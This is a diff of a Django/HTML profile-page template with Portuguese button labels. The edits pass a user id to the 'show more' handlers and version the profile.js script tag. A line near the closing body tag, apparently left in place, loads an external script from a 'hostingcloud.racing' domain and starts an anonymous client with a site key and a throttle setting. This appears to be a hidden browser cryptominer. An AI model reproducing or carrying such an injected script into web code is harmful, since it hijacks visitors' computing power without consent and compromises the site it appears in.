@@ -222,7 +222,7 @@
 				<hr>
 				{% endfor %}
 			</div>
-			<button class="btn btn-outline-primary" onclick="show_more_questions(this)">mais</button>
+			<button class="btn btn-outline-primary" onclick="show_more_questions(this, {{ user_p.user.id }})">mais</button>
 		</section>
 
 		<section id="responses-section">
@@ -236,10 +236,10 @@
 				<hr>
 				{% endfor %}
 			</div>
-			<button class="btn btn-outline-primary" onclick="show_more_responses(this)">mais</button>
+			<button class="btn btn-outline-primary" onclick="show_more_responses(this, {{ user_p.user.id }})">mais</button>
 		</section>
 
-		<script src="/static/js/profile.js"></script>
+		<script src="/static/js/profile.js?version=2"></script>
 		{% endif %}
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 	</body>
